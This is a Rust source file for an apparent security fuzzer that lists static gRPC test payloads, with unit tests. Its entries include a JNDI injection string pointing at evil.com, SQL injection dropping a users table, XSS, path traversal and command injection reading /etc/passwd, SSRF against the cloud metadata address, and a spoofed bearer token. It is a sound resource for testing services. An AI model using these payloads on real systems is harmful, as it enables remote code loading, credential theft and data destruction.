#![allow(clippy::vec_init_then_push)]
//! Static gRPC abuse payloads: reflection queries, metadata injection,
//! message-field injection, and streaming abuse.
//!
//! These are **data**. The gRPC *prober* — `GrpcFuzzer`, reflection
//! `discover_methods`, and the live `reqwest` probe — stays in the `eggsec`
//! engine, in `eggsec::fuzzer::payloads::grpc`.

use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: "{\"listServices\":{}}".to_string(),
        description: "gRPC reflection - list services".to_string(),
        severity: Severity::Info,
        tags: vec!["grpc".to_string(), "reflection".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: "{\"a\":\"${jndi:ldap://evil.com/a}\"}".to_string(),
        description: "gRPC JNDI injection".to_string(),
        severity: Severity::Critical,
        tags: vec!["grpc".to_string(), "injection".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: r#"{"fileDescriptorProtos":{"omitSymbolDependencies":true}}"#.to_string(),
        description: "gRPC reflection - full introspection query".to_string(),
        severity: Severity::Info,
        tags: vec![
            "grpc".to_string(),
            "reflection".to_string(),
            "introspection".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: r#"{"fileByFilename":"google/protobuf/descriptor.proto"}"#.to_string(),
        description: "gRPC reflection - get proto file descriptor".to_string(),
        severity: Severity::Medium,
        tags: vec![
            "grpc".to_string(),
            "reflection".to_string(),
            "proto-leak".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: "authorization=Bearer fake-token".to_string(),
        description: "gRPC metadata injection - auth spoof via metadata header".to_string(),
        severity: Severity::High,
        tags: vec![
            "grpc".to_string(),
            "auth".to_string(),
            "metadata-injection".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: r#"{"message":"'; DROP TABLE users--"}"#.to_string(),
        description: "gRPC SQL injection in message field".to_string(),
        severity: Severity::Critical,
        tags: vec![
            "grpc".to_string(),
            "sqli".to_string(),
            "injection".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: r#"{"name":"<script>alert(1)</script>"}"#.to_string(),
        description: "gRPC XSS in field value".to_string(),
        severity: Severity::High,
        tags: vec![
            "grpc".to_string(),
            "xss".to_string(),
            "injection".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: r#"{"filename":"../../etc/passwd"}"#.to_string(),
        description: "gRPC path traversal in filename field".to_string(),
        severity: Severity::Critical,
        tags: vec![
            "grpc".to_string(),
            "path-traversal".to_string(),
            "lfi".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: r#"{"url":"http://169.254.169.254/latest/meta-data/"}"#.to_string(),
        description: "gRPC SSRF via URL field targeting cloud metadata".to_string(),
        severity: Severity::Critical,
        tags: vec!["grpc".to_string(), "ssrf".to_string(), "cloud".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: r#"{"input":"; cat /etc/passwd"}"#.to_string(),
        description: "gRPC command injection in input field".to_string(),
        severity: Severity::Critical,
        tags: vec![
            "grpc".to_string(),
            "command-injection".to_string(),
            "rce".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: "{}".to_string(),
        description: "gRPC empty message - test default handling".to_string(),
        severity: Severity::Low,
        tags: vec!["grpc".to_string(), "fuzz".to_string(), "empty".to_string()],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: format!(r#"{{"data":"{}"}}"#, "A".repeat(10000)),
        description: "gRPC large message payload (10KB) - buffer/limit test".to_string(),
        severity: Severity::Medium,
        tags: vec![
            "grpc".to_string(),
            "fuzz".to_string(),
            "overflow".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: r#"{"input":"test\x00admin"}"#.to_string(),
        description: "gRPC null byte injection in input field".to_string(),
        severity: Severity::High,
        tags: vec![
            "grpc".to_string(),
            "null-byte".to_string(),
            "injection".to_string(),
        ],
    });

    payloads.push(Payload {
        payload_type: PayloadType::Grpc,
        payload: r#"{"a":{"b":{"c":{"d":{"e":"f"}}}}}"#.to_string(),
        description: "gRPC deep nesting - depth limit and parser stress test".to_string(),
        severity: Severity::Medium,
        tags: vec![
            "grpc".to_string(),
            "fuzz".to_string(),
            "depth-limit".to_string(),
        ],
    });

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty_and_labelled() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
        for p in &payloads {
            assert_eq!(p.payload_type, PayloadType::Grpc);
            assert!(!p.payload.is_empty());
            assert!(!p.tags.is_empty());
        }
    }

    #[test]
    fn contains_reflection_and_injection_probes() {
        let payloads = get_payloads();
        assert!(
            payloads.iter().any(|p| p.payload.contains("listServices")),
            "missing the gRPC reflection probe"
        );
        assert!(
            payloads
                .iter()
                .any(|p| p.payload.contains("jndi:ldap://") && p.severity == Severity::Critical),
            "JNDI injection through a gRPC message must be present and Critical"
        );
    }
}
